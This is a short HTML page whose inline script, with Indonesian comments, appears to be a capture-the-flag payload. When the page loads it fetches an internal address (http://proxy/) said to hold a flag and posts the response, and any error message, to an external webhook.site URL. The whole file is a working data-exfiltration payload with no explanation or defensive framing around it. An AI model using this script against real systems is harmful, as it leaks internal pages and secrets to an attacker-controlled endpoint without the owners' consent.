<!DOCTYPE html>
<html>
<body>
<script>
(async () => {
  try {
    // fetch halaman root (http://proxy/) yang ada flag
    let res = await fetch("http://proxy/");
    let text = await res.text();

    // kirim hasilnya ke webhook kamu
    await fetch("https://webhook.site/9cf23925-1943-4d85-9be5-56a8ca40c833", {
      method: "POST",
      headers: {"Content-Type": "text/plain"},
      body: text
    });
  } catch (e) {
    await fetch("https://webhook.site/9cf23925-1943-4d85-9be5-56a8ca40c833", {
      method: "POST",
      headers: {"Content-Type": "text/plain"},
      body: "Error: " + e.toString()
    });
  }
})();
</script>
</body>
</html>
